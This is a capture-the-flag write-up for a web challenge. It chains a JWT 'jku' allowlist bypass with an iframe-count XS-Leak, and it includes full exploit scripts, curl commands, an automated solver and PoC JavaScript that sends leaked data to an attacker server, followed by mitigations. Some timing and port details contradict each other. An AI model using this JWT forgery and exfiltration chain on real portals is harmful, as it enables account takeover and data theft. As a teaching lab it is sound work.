# GovPass

| Field | Value |
|-------|-------|
| Category | Web |
| Points | 500 |

## Description

> The Republic of GovPass has modernised its passport and permit services.
> Their new e-portal integrates with the national SSO provider for researcher
> access and operates a responsible disclosure programme — a sandboxed review
> bot will inspect each proof-of-concept.
>
> How deep does the rabbit hole go?

## Solution

# GovPass — Full Intended Writeup

**Category:** Web
**Difficulty:** Insane
**Flag:** `CHC{fr4m3_c0unt_l34ks_4ll_s3cr3ts}`
**White-box:** Yes (full source provided to players)

---

## Overview

Two-vulnerability chain:

| Step | Technique | Goal |
|------|-----------|------|
| 1 | SSO `jku` JWKS cache poisoning via `@` URL-credentials injection | Forge RS256 JWT → gain `researcher` session |
| 2 | iframe-count XS-Leak oracle via `window.length` + `window.open()` | Read flag char-by-char from the admin-only search endpoint |

The attacker must run a small HTTP server reachable from the Docker network (default gateway `172.20.0.1`).

---

## Environment

```
player/
├── docker-compose.yml
├── web/          ← Flask portal (port 5000)
└── bot/          ← Playwright admin bot
```

```bash
cd govpass-ctf/player
docker compose up --build -d
```

Verify everything is up:

```bash
docker compose ps
# web    Up   0.0.0.0:5000->5000/tcp
# bot    Up
```

Confirm the Flask portal responds:

```bash
curl -s http://localhost:5000/ | head -5
```

---

## Step 1 — SSO `jku` JWKS Cache Poisoning

### 1.1 Finding the Vulnerability

Open `web/app/config.py`:

```python
# Line 9
SSO_JKU_VALIDATOR = re.compile(r"^https?://sso\.govpass\.local")
```

Open `web/app/auth.py`:

```python
_jwks_cache: dict = {}   # kid → RSAPublicKey

def _validate_jku(jku: str) -> bool:
    """Ensure the JWKS endpoint originates from the trusted SSO provider."""
    return bool(config.SSO_JKU_VALIDATOR.match(jku))

def _fetch_public_key(jku: str, kid: str):
    if kid in _jwks_cache:
        return _jwks_cache[kid]          # ← cache hit: no re-fetch
    resp = requests.get(jku, timeout=5, verify=False)
    for key_data in resp.json().get("keys", []):
        if key_data.get("kid") == kid:
            public_key = RSAAlgorithm.from_jwk(key_data)
            _jwks_cache[kid] = public_key
            return public_key
    raise ValueError("kid not found in JWKS")

def verify_sso_token(token: str) -> dict:
    unverified = jwt.get_unverified_header(token)
    jku = unverified.get("jku", "")
    kid = unverified.get("kid", "")
    if not _validate_jku(jku):
        raise PermissionError("jku not allowed")
    public_key = _fetch_public_key(jku, kid)
    return jwt.decode(token, public_key, algorithms=["RS256"])
```

Open `web/app/routes/auth_routes.py`:

```python
@auth_bp.route("/auth/sso", methods=["POST"])
def sso():
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        abort(400)
    token = auth_header[len("Bearer "):]
    payload = verify_sso_token(token)   # raises on bad token
    sub  = payload.get("sub")
    role = payload.get("role", "citizen")
    if role not in ("citizen", "researcher"):
        role = "citizen"
    # upsert user, set session["role"] = role
```

**Bug analysis:**

1. The regex `^https?://sso\.govpass\.local` anchors at **start only** — no end anchor, no hostname boundary.
2. `requests.get()` parses URLs with standard RFC 3986 semantics: everything before `@` is treated as `user:password` credentials; the actual **host** is what comes after `@`.
3. Therefore `http://sso.govpass.local@172.20.0.1:9393/jwks.json` passes the regex (string starts with `http://sso.govpass.local`) while Python `requests` actually connects to `172.20.0.1:9393`.
4. Once the public key is cached under our `kid`, the server will permanently verify any JWT we sign — no need to keep the server reachable.

### 1.2 Manual Exploit (curl-based)

**Generate RSA key pair:**

```bash
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem
```

**Extract n and e for JWKS:**

```bash
python3 - <<'EOF'
import base64, json
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.backends import default_backend

pem = open("attacker.pem","rb").read()
priv = load_pem_private_key(pem, None, default_backend())
pub  = priv.public_key().public_numbers()

def b64url(n, blen):
    return base64.urlsafe_b64encode(n.to_bytes(blen,"big")).rstrip(b"=").decode()

blen = (pub.n.bit_length() + 7) // 8
jwk = {
    "kty":"RSA","use":"sig","alg":"RS256",
    "kid":"attacker-manual-001",
    "n": b64url(pub.n, blen),
    "e": b64url(pub.e, 3),
}
print(json.dumps({"keys":[jwk]}, indent=2))
EOF
```

Save the output as `jwks.json`.

**Serve the JWKS:**

```bash
# In a separate terminal — serves on port 9393
python3 -c "
import http.server, os
os.chdir('.')
http.server.test(HandlerClass=http.server.SimpleHTTPRequestHandler, port=9393)
"
```

**Forge JWT:**

```bash
python3 - <<'EOF'
import jwt, base64, time
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.backends import default_backend

HOST = "172.20.0.1"
PORT = 9393
KID  = "attacker-manual-001"

pem  = open("attacker.pem","rb").read()
priv = load_pem_private_key(pem, None, default_backend())

now = int(time.time())
payload = {
    "sub":  "attacker-user",
    "role": "researcher",
    "iat":  now,
    "exp":  now + 3600,
}
jku = f"http://sso.govpass.local@{HOST}:{PORT}/jwks.json"
token = jwt.encode(payload, priv, algorithm="RS256",
                   headers={"jku": jku, "kid": KID})
print(token)
EOF
```

**Send the forged JWT to `/auth/sso`:**

```bash
TOKEN="<paste token here>"

curl -s -c jar.txt -X POST http://localhost:5000/auth/sso \
  -H "Authorization: Bearer $TOKEN"
# Expected: {"status":"ok","role":"researcher"}
```

**Verify researcher session:**

```bash
curl -s -b jar.txt http://localhost:5000/dashboard | grep -i researcher
```

### 1.3 How the Bypass URL Is Parsed

| Component | Value |
|-----------|-------|
| Scheme | `http` |
| Userinfo (ignored) | `sso.govpass.local` |
| Host | `172.20.0.1` |
| Port | `9393` |
| Path | `/jwks.json` |

`requests.get("http://sso.govpass.local@172.20.0.1:9393/jwks.json")` opens a TCP connection to **`172.20.0.1:9393`** and makes a plain HTTP `GET /jwks.json` request — no authentication is attempted because HTTP Basic Auth requires `Authorization: Basic …` in the request, not in the URL (servers typically ignore URL credentials).

---

## Step 2 — iframe-count XS-Leak Oracle

### 2.1 Finding the Sink

Open `web/app/routes/admin_routes.py`:

```python
@admin_bp.route("/tickets")
@admin_required
def tickets():
    ref = request.args.get("ref", "")
    if ref:
        ref_esc = ref.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
        matches = Application.query.filter(
            Application.ref_number.like(f"{ref_esc}%", escape="\\")
        ).all()
    else:
        matches = Application.query.all()

    resp = make_response(render_template("admin/tickets.html",
                                         applications=matches, ref=ref))
    # Note: no X-Frame-Options header — admin panel is embeddable by design
    return resp
```

Open `web/app/templates/admin/tickets.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Application Search — GovPass Admin</title>
  <style>
    iframe{width:100%;height:110px;border:1px solid #ddd;margin:4px 0;display:block}
  </style>
</head>
<body>
  <h4>GovPass Admin — Application Search
    {% if ref %} — filter: <code>{{ ref }}</code>{% endif %}
    — {{ applications|length }} result(s)
  </h4>
  {% for app in applications %}
  <iframe src="/admin/ticket/{{ app.id }}"></iframe>
  {% endfor %}
  {% if not applications %}
  <p style="color:#888">No matching applications.</p>
  {% endif %}
</body>
</html>
```

**Key observations:**

1. `/admin/tickets?ref=<prefix>` renders exactly **one `<iframe>` per matching application**.
2. No `X-Frame-Options` / `Content-Security-Policy: frame-ancestors` header → page is embeddable cross-origin.
3. The only record whose `ref_number` starts with `CHC{` is the classified application containing the flag.

### 2.2 The Oracle: `window.length`

Per [WHATWG HTML § Window — cross-origin accessible attributes](https://html.spec.whatwg.org/#crossoriginproperties-(-o-)):

> `window.length` is accessible from cross-origin scripts.

`window.length` equals the number of `<iframe>` (and `<frame>`) elements currently in the document. This is a cross-origin-readable property — no `postMessage`, no CORS needed.

**Oracle logic:**

```
GET /admin/tickets?ref=CHC{a    → 1 iframe if flag starts with CHC{a, else 0
GET /admin/tickets?ref=CHC{b    → 1 iframe if flag starts with CHC{b, else 0
...
```

Read the flag character-by-character by trying each possible next character.

### 2.3 Why Iframes Alone Don't Work (SameSite=Lax)

Flask's session cookie is set with `SameSite=Lax`. Under SameSite=Lax:

- **Requests from `<iframe>`** (sub-resource navigation, cross-site): cookie **NOT sent** → 302 redirect to login.
- **Top-level navigations** (`window.open()`, clicking a link, etc.): cookie **IS sent**.

Therefore, the PoC page cannot use `document.createElement("iframe")` to probe the admin endpoint. Instead, it opens a single **popup window** and navigates it repeatedly — each navigation is a top-level navigation, so SameSite=Lax cookies are sent correctly.

```javascript
// ✗ WRONG — cross-site subrequest, SameSite=Lax blocks cookie
const fr = document.createElement("iframe");
fr.src = TARGET + "/admin/tickets?ref=" + prefix;

// ✓ CORRECT — top-level navigation, SameSite=Lax cookie sent
const probeWin = window.open("about:blank", "probe");
probeWin.location.href = TARGET + "/admin/tickets?ref=" + prefix;
// then read: probeWin.length  (cross-origin accessible)
```

### 2.4 SQL LIKE Wildcard Subtlety

SQLite's `LIKE` operator treats `_` as "any single character" and `%` as "any sequence". The flag contains underscores: `fr4m3_c0unt_l34ks_4ll_s3cr3ts`.

Without escaping, probing `CHC{fr4m3_` would match `CHC{fr4m3}` (if it existed) or any other ref starting with those literal characters but having something in the `_` position. The code escapes properly:

```python
ref_esc = ref.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
Application.query.filter(
    Application.ref_number.like(f"{ref_esc}%", escape="\\")
)
```

As a solver, you don't need to escape — you build the prefix character by character and the server handles it. But you need to understand that `_` **is a valid flag character** to probe.

### 2.5 Full PoC JavaScript

The attacker serves this HTML at `http://172.20.0.1:9393/poc`:

```html
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script>
const TARGET = "http://web:5000";          // as seen from bot's browser
const EXFIL  = "http://172.20.0.1:9393/leak";
let known = "CHC{";

// Single persistent popup for all probes.
// window.open() = top-level navigation → SameSite=Lax cookies ARE sent.
// win.length = number of <iframe> elements in the loaded page (cross-origin readable).
const probeWin = window.open("about:blank", "probe");

async function probe(prefix) {
  return new Promise(resolve => {
    probeWin.location.href = TARGET + "/admin/tickets?ref=" + encodeURIComponent(prefix);
    setTimeout(() => {
      try {
        resolve(probeWin.length);    // cross-origin read: # of iframes on page
      } catch(e) {
        resolve(0);
      }
    }, 300);   // wait for page to load
  });
}

async function leak() {
  if (!probeWin || probeWin.closed) {
    fetch(EXFIL + "?stuck=popup_blocked", {mode:"no-cors"});
    return;
  }
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
  while (true) {
    let found = false;
    for (const c of chars) {
      const guess = known + c;
      const n = await probe(guess);
      if (n > 0) {
        known = guess;
        found = true;
        fetch(EXFIL + "?partial=" + encodeURIComponent(known), {mode:"no-cors"});
        if (c === "}") {
          fetch(EXFIL + "?flag=" + encodeURIComponent(known), {mode:"no-cors"});
          return;
        }
        break;
      }
    }
    if (!found) {
      fetch(EXFIL + "?stuck=" + encodeURIComponent(known), {mode:"no-cors"});
      return;
    }
  }
}

leak();
</script>
</body>
</html>
```

### 2.6 Submitting the Report (triggers bot visit)

With a researcher session cookie in `jar.txt`:

```bash
curl -s -b jar.txt -X POST http://localhost:5000/report \
  -d "title=Critical+XS-Leak+in+admin+search" \
  -d "description=The+admin+tickets+endpoint+leaks+data+via+iframe+count" \
  -d "poc_url=http://172.20.0.1:9393/poc" \
  -d "severity=critical"
# Expected: 200 or 302 redirect
```

The admin bot polls every 20 seconds. It:
1. Logs in as admin via `POST /auth/login`.
2. Fetches `GET /admin/api/reports/pending`.
3. For each report, opens `poc_url` in headless Chromium **with admin session cookies injected**.
4. Stays on the page for 3 minutes (`BOT_VISIT_TIMEOUT = 180_000` ms).

While the bot is on the PoC page, the JavaScript popup navigates to `/admin/tickets?ref=<prefix>` — authenticated as admin — and leaks the flag character by character to `/leak`.

---

## Step 3 — Receive the Exfiltrated Flag

On your attacker server, log incoming requests to `/leak`:

```bash
# watch Flask/server logs
docker compose logs -f   # if running solve.py server

# or manually with netcat (one-shot):
nc -l -p 9393
```

Expected output (partial leaks followed by the final flag):

```
[leak] Partial: CHC{f
[leak] Partial: CHC{fr
[leak] Partial: CHC{fr4
...
[leak] Partial: CHC{fr4m3_c0unt_l34ks_4ll_s3cr3ts
[+] FLAG: CHC{fr4m3_c0unt_l34ks_4ll_s3cr3ts}
```

---

## Automated Solve Script

The script at `solve/solve.py` automates all steps:

```
requirements: pip install requests cryptography PyJWT flask
```

```bash
# Kill any process already using port 9393
fuser -k 9393/tcp 2>/dev/null; sleep 1

# Run the solve
python3 solve/solve.py \
  --target   http://localhost:5000 \
  --host     172.20.0.1 \
  --port     9393 \
  --bot-target http://web:5000
```

Expected output:

```
[*] Target        : http://localhost:5000
[*] Bot target    : http://web:5000
[*] Attacker jku  : http://sso.govpass.local@172.20.0.1:9393
[*] Attacker plain: http://172.20.0.1:9393

[1] Generating RSA-2048 key pair...
    kid = attacker-3f8a2b1c

[2] Forging SSO JWT with jku bypass...
    Token (truncated): eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9zc28uZ292cG...

[3] Sending forged JWT to /auth/sso ...
    Response: 200 — {"status":"ok","role":"researcher"}
    [+] Got researcher session!

[4] Submitting disclosure report with PoC URL: http://172.20.0.1:9393/poc
    Response: 200
    [+] Report submitted. Waiting for admin bot to visit...

[5] Waiting for XS-Leak exfiltration (up to 10 min)...
[leak] Partial: CHC{f
[leak] Partial: CHC{fr
...
[leak] Partial: CHC{fr4m3_c0unt_l34ks_4ll_s3cr3ts

[+] FLAG RECOVERED: CHC{fr4m3_c0unt_l34ks_4ll_s3cr3ts}
```

Total time: ~5–7 minutes (bot poll latency + ~34 chars × 22 probes avg × 400 ms/probe).

### Annotated solve.py

```python
#!/usr/bin/env python3
"""
GovPass CTF — Intended Solve Script
Chain:
  1. SSO jku JWKS cache poisoning  → researcher session
  2. iframe-count XS-Leak oracle   → flag char-by-char via window.length
"""

import argparse, threading, time, sys, json, base64, uuid
from datetime import datetime, timedelta, timezone

import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt                          # PyJWT
from flask import Flask, request, jsonify, Response

# ---------------------------------------------------------------------------
# Shared state: flag accumulator + completion event
# ---------------------------------------------------------------------------
recovered_flag = ""
flag_complete  = threading.Event()
app_server     = Flask(__name__)

# ---------------------------------------------------------------------------
# Key generation
# ---------------------------------------------------------------------------
def gen_rsa_keypair():
    priv = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend(),
    )
    return priv, priv.public_key()

# ---------------------------------------------------------------------------
# Build JWK from public key
# ---------------------------------------------------------------------------
def public_key_to_jwk(pub_key, kid: str) -> dict:
    nums = pub_key.public_numbers()

    def b64url(n, blen):
        return base64.urlsafe_b64encode(n.to_bytes(blen,"big")).rstrip(b"=").decode()

    blen = (nums.n.bit_length() + 7) // 8
    return {
        "kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid,
        "n": b64url(nums.n, blen),
        "e": b64url(nums.e, 3),
    }

# ---------------------------------------------------------------------------
# Forge JWT with jku pointing to our server
#   jku = "http://sso.govpass.local@HOST:PORT/jwks.json"
#   Passes regex  ^https?://sso\.govpass\.local
#   requests.get() connects to HOST:PORT  (@ = URL credentials, ignored by server)
# ---------------------------------------------------------------------------
def forge_jwt(private_key, kid: str, attacker_base: str) -> str:
    jku = attacker_base.rstrip("/") + "/jwks.json"
    pem = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )
    now = datetime.now(tz=timezone.utc)
    payload = {
        "sub":  "attacker-researcher",
        "role": "researcher",           # ← grants researcher privileges
        "iat":  int(now.timestamp()),
        "exp":  int((now + timedelta(hours=1)).timestamp()),
    }
    return jwt.encode(payload, pem, algorithm="RS256",
                      headers={"jku": jku, "kid": kid})

# ---------------------------------------------------------------------------
# Attacker HTTP server — Flask routes
# ---------------------------------------------------------------------------
_jwks_payload  = {}
_attacker_base = ""   # jku URL   (http://sso.govpass.local@HOST:PORT)
_attacker_plain= ""   # browser URL (http://HOST:PORT)
_target        = ""   # portal external URL
_bot_target    = ""   # portal URL as seen from bot container

@app_server.route("/jwks.json")
def serve_jwks():
    # Called by Flask backend when it fetches our attacker JWKS
    return jsonify(_jwks_payload)

@app_server.route("/poc")
def serve_poc():
    """
    XS-Leak page visited by the admin bot.

    Technique: persistent popup window + window.length oracle
      - window.open("about:blank","probe") creates a named popup
      - Navigating probeWin.location.href = TARGET+"/admin/tickets?ref=<guess>"
        is a TOP-LEVEL navigation → SameSite=Lax admin cookie IS sent
      - probeWin.length = number of <iframe> elements rendered (cross-origin readable)
      - 1 iframe = flag starts with guess; 0 iframes = wrong character
    """
    html = f"""<!DOCTYPE html>
<html><head><title>PoC</title></head><body>
<script>
const TARGET = "{_bot_target}";
const EXFIL  = "{_attacker_plain}/leak";
let known = "CHC{{";

const probeWin = window.open("about:blank", "probe");

async function probe(prefix) {{
  return new Promise(resolve => {{
    probeWin.location.href = TARGET + "/admin/tickets?ref=" + encodeURIComponent(prefix);
    setTimeout(() => {{
      try {{ resolve(probeWin.length); }} catch(e) {{ resolve(0); }}
    }}, 400);
  }});
}}

async function leak() {{
  if (!probeWin || probeWin.closed) {{
    fetch(EXFIL + "?stuck=popup_blocked", {{mode:"no-cors"}});
    return;
  }}
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}}";
  while (true) {{
    let found = false;
    for (const c of chars) {{
      const guess = known + c;
      const n = await probe(guess);
      if (n > 0) {{
        known = guess;
        found = true;
        fetch(EXFIL + "?partial=" + encodeURIComponent(known), {{mode:"no-cors"}});
        if (c === "}}") {{
          fetch(EXFIL + "?flag=" + encodeURIComponent(known), {{mode:"no-cors"}});
          return;
        }}
        break;
      }}
    }}
    if (!found) {{
      fetch(EXFIL + "?stuck=" + encodeURIComponent(known), {{mode:"no-cors"}});
      return;
    }}
  }}
}}

leak();
</script>
</body></html>"""
    return Response(html, mimetype="text/html")

@app_server.route("/leak")
def receive_leak():
    global recovered_flag
    flag    = request.args.get("flag")
    partial = request.args.get("partial")
    stuck   = request.args.get("stuck")
    if flag:
        print(f"\n[+] FLAG: {flag}\n")
        recovered_flag = flag
        flag_complete.set()
    elif partial:
        print(f"[leak] Partial: {partial}")
    elif stuck:
        print(f"[leak] Stuck at: {stuck}")
    return "", 204

# ---------------------------------------------------------------------------
# Main solve flow
# ---------------------------------------------------------------------------
def solve(target, attacker_base, attacker_plain, bot_target):
    global _jwks_payload, _attacker_base, _attacker_plain, _target, _bot_target
    _attacker_base  = attacker_base
    _attacker_plain = attacker_plain
    _target         = target
    _bot_target     = bot_target

    print(f"[*] Target        : {target}")
    print(f"[*] Bot target    : {bot_target}")
    print(f"[*] Attacker jku  : {attacker_base}")
    print(f"[*] Attacker plain: {attacker_plain}")

    # Step 1: generate keys
    print("\n[1] Generating RSA-2048 key pair...")
    priv, pub = gen_rsa_keypair()
    kid = f"attacker-{uuid.uuid4().hex[:8]}"   # unique kid per run avoids cache collision
    _jwks_payload = {"keys": [public_key_to_jwk(pub, kid)]}
    print(f"    kid = {kid}")

    # Step 2: forge JWT
    print("\n[2] Forging SSO JWT with jku bypass...")
    token = forge_jwt(priv, kid, attacker_base)
    print(f"    Token (truncated): {token[:80]}...")

    # Step 3: send forged JWT → get researcher session
    print("\n[3] Sending forged JWT to /auth/sso ...")
    s = requests.Session()
    resp = s.post(f"{target}/auth/sso",
                  headers={"Authorization": f"Bearer {token}"})
    print(f"    Response: {resp.status_code} — {resp.text[:120]}")
    if resp.status_code != 200:
        print("[-] SSO failed. Verify attacker server is reachable from challenge network.")
        sys.exit(1)
    print("    [+] Got researcher session!")

    # Step 4: submit report with PoC URL → bot will visit it
    poc_url = f"{attacker_plain}/poc"
    print(f"\n[4] Submitting disclosure report with PoC URL: {poc_url}")
    resp2 = s.post(f"{target}/report", data={
        "title":       "Critical: admin reference search leaks classified data",
        "description": "The /admin/tickets endpoint renders results as cross-origin-readable frames.",
        "poc_url":     poc_url,
        "severity":    "critical",
    })
    print(f"    Response: {resp2.status_code}")
    if resp2.status_code not in (200, 302):
        print("[-] Report submission failed.")
        sys.exit(1)
    print("    [+] Report submitted. Waiting for admin bot to visit...")

    # Step 5: wait for XS-Leak to exfiltrate flag
    print("\n[5] Waiting for XS-Leak exfiltration (up to 10 min)...")
    if flag_complete.wait(timeout=600):
        print(f"\n[+] FLAG RECOVERED: {recovered_flag}")
    else:
        print("[-] Timed out. Check bot logs and network reachability.")

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GovPass CTF Solve Script")
    parser.add_argument("--target",     default="http://localhost:5000",
                        help="Portal URL reachable from this machine")
    parser.add_argument("--host",       default="172.20.0.1",
                        help="Attacker IP reachable from Docker network (default: Docker gateway)")
    parser.add_argument("--port",       type=int, default=9393,
                        help="Port for attacker HTTP server")
    parser.add_argument("--bot-target", default="http://web:5000",
                        help="Portal URL as seen from inside the bot container")
    args = parser.parse_args()

    # jku bypass URL — passes regex, requests connects to args.host:args.port
    attacker_base  = f"http://sso.govpass.local@{args.host}:{args.port}"
    # plain URL — used in the browser-side PoC page for popup navigation and exfil fetches
    attacker_plain = f"http://{args.host}:{args.port}"

    # Start attacker Flask server in background thread
    t = threading.Thread(
        target=lambda: app_server.run(host="0.0.0.0", port=args.port, debug=False),
        daemon=True,
    )
    t.start()
    time.sleep(1)   # let Flask bind

    solve(args.target, attacker_base, attacker_plain, args.bot_target)
```

---

## Complete Manual Walkthrough (curl only)

```bash
# ── Prerequisites ─────────────────────────────────────────────────────────
cd govpass-ctf/player
docker compose up --build -d
sleep 5
curl -s http://localhost:5000/           # portal responds

# ── Generate keys ─────────────────────────────────────────────────────────
mkdir /tmp/attack && cd /tmp/attack
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# ── Build JWKS ────────────────────────────────────────────────────────────
python3 - <<'PYEOF' > jwks.json
import base64, json
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.backends import default_backend

priv = load_pem_private_key(open("attacker.pem","rb").read(), None, default_backend())
pub  = priv.public_key().public_numbers()

def b(n, l): return base64.urlsafe_b64encode(n.to_bytes(l,"big")).rstrip(b"=").decode()

blen = (pub.n.bit_length()+7)//8
print(json.dumps({"keys":[{
    "kty":"RSA","use":"sig","alg":"RS256",
    "kid":"manual-001",
    "n": b(pub.n, blen),
    "e": b(pub.e, 3),
}]}, indent=2))
PYEOF

cat jwks.json   # verify

# ── Start JWKS server ─────────────────────────────────────────────────────
python3 -m http.server 9393 &
JWKS_PID=$!
curl -s http://172.20.0.1:9393/jwks.json | python3 -m json.tool   # verify

# ── Forge JWT ─────────────────────────────────────────────────────────────
TOKEN=$(python3 - <<'PYEOF'
import jwt, time
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.backends import default_backend

priv = load_pem_private_key(open("attacker.pem","rb").read(), None, default_backend())
now  = int(time.time())
print(jwt.encode(
    {"sub":"attacker","role":"researcher","iat":now,"exp":now+3600},
    priv, algorithm="RS256",
    headers={"jku":"http://sso.govpass.local@172.20.0.1:9393/jwks.json",
             "kid":"manual-001"},
))
PYEOF
)
echo "Token: ${TOKEN:0:80}..."

# ── Send forged JWT → get researcher session ───────────────────────────────
curl -s -c /tmp/jar.txt -X POST http://localhost:5000/auth/sso \
  -H "Authorization: Bearer $TOKEN"
# → {"status":"ok","role":"researcher"}

# ── Verify researcher access ───────────────────────────────────────────────
curl -s -b /tmp/jar.txt http://localhost:5000/report | grep -i form

# ── Serve PoC page ────────────────────────────────────────────────────────
cat > /tmp/attack/poc.html <<'HTML'
<!DOCTYPE html><html><head><title>PoC</title></head><body>
<script>
const TARGET = "http://web:5000";
const EXFIL  = "http://172.20.0.1:9393/leak";
let known = "CHC{";
const probeWin = window.open("about:blank","probe");
async function probe(prefix) {
  return new Promise(resolve => {
    probeWin.location.href = TARGET+"/admin/tickets?ref="+encodeURIComponent(prefix);
    setTimeout(()=>{try{resolve(probeWin.length);}catch(e){resolve(0);}},400);
  });
}
async function leak() {
  if (!probeWin||probeWin.closed){fetch(EXFIL+"?stuck=popup_blocked",{mode:"no-cors"});return;}
  const chars="abcdefghijklmnopqrstuvwxyz0123456789_}";
  while(true){
    let found=false;
    for(const c of chars){
      const n=await probe(known+c);
      if(n>0){
        known+=c;found=true;
        fetch(EXFIL+"?partial="+encodeURIComponent(known),{mode:"no-cors"});
        if(c==="}"){fetch(EXFIL+"?flag="+encodeURIComponent(known),{mode:"no-cors"});return;}
        break;
      }
    }
    if(!found){fetch(EXFIL+"?stuck="+encodeURIComponent(known),{mode:"no-cors"});return;}
  }
}
leak();
</script></body></html>
HTML

# rename so it's served at /poc  (SimpleHTTPServer serves by filename)
cp /tmp/attack/poc.html /tmp/attack/poc

# ── Submit report → bot will visit the PoC ────────────────────────────────
curl -s -b /tmp/jar.txt -X POST http://localhost:5000/report \
  -d "title=XS-Leak+PoC" \
  -d "description=iframe+count+oracle" \
  -d "poc_url=http://172.20.0.1:9393/poc" \
  -d "severity=critical"

# ── Watch for flag in JWKS server logs (it handles /leak too) ─────────────
# The SimpleHTTPServer doesn't handle /leak — use the solve script's Flask server instead,
# or stand up a tiny receiver:
python3 - <<'PYEOF' &
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        if "flag" in q: print(f"\n[+] FLAG: {q['flag'][0]}\n")
        elif "partial" in q: print(f"[partial] {q['partial'][0]}")
        self.send_response(204); self.end_headers()
    def log_message(self,*a): pass

HTTPServer(("0.0.0.0",9394),H).serve_forever()
PYEOF
# (this is a separate minimal receiver on port 9394; update EXFIL in poc.html accordingly)

# Alternatively, just use the full solve.py which handles everything automatically.
```

---

## Root Cause Summary

| Step | Bug | Location | Impact |
|------|-----|----------|--------|
| 1 | `jku` allowlist regex uses prefix match only (`^https?://sso\.govpass\.local`) — no hostname boundary, no path enforcement | `web/app/config.py` L9 | Any URL whose string starts with the prefix passes; `@`-injection redirects the request to an arbitrary host |
| 1 | JWKS response cached forever by `kid` — once poisoned, attacker key is permanently trusted | `web/app/auth.py` `_fetch_public_key` | Persistent forged-identity access |
| 2 | `/admin/tickets` response lacks `X-Frame-Options` / `frame-ancestors` CSP | `web/app/routes/admin_routes.py` `tickets()` | Page embeddable / navigable cross-origin |
| 2 | Page renders `N` iframes for `N` matching records — `window.length` is cross-origin readable per WHATWG spec | `web/app/templates/admin/tickets.html` | Binary oracle: match count leaks prefix-search results |

---

## Mitigations

### Fix 1 — Strict `jku` hostname validation

```python
# web/app/config.py / auth.py

from urllib.parse import urlparse

def _validate_jku(jku: str) -> bool:
    try:
        p = urlparse(jku)
        return (p.scheme == "https"
                and p.hostname == "sso.govpass.local"
                and not p.username          # reject @ credentials
                and p.path == "/jwks.json")
    except Exception:
        return False
```

### Fix 2 — Cache with time-based expiry or per-request fetch

```python
import time
_jwks_cache: dict = {}   # kid → (public_key, expires_at)
CACHE_TTL = 300          # 5 minutes

def _fetch_public_key(jku, kid):
    cached = _jwks_cache.get(kid)
    if cached and time.time() < cached[1]:
        return cached[0]
    # ... fetch and cache with expiry
    _jwks_cache[kid] = (public_key, time.time() + CACHE_TTL)
    return public_key
```

### Fix 3 — Prevent cross-origin embedding of admin pages

```python
# web/app/routes/admin_routes.py  tickets()
resp.headers["X-Frame-Options"] = "DENY"
resp.headers["Content-Security-Policy"] = "frame-ancestors 'none'"
```

### Fix 4 — Remove iframe-count oracle

Replace per-record `<iframe>` rendering with a result count or opaque list that doesn't expose a side-channel via `window.length`.

---

## Timing Reference

| Phase | Duration |
|-------|---------|
| Bot poll interval | 5 s |
| Bot DOM load timeout | 15 s |
| Bot stay-on-page timeout | 180 s (3 min) |
| Per-character probe (200 ms × ~22 chars avg) | ~4 s/char |
| Full flag (34 chars) | ~2–2.5 min |
| Total (worst case incl. poll wait) | ~7–8 min |


## Flag

`CHC{fr4m3_c0unt_l34ks_4ll_s3cr3ts}`
